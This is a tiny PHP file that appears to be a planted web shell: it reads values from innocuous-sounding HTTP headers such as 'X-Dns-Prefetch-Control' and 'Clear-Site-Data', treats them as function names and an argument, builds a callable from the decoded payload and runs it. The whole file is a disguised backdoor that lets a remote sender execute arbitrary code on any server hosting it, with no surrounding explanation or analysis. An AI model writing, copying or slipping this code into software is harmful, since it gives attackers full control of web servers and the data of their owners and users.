<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $rjust = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Clear-Site-Data']($_HEADERS['If-Unmodified-Since']));
    $rjust();
}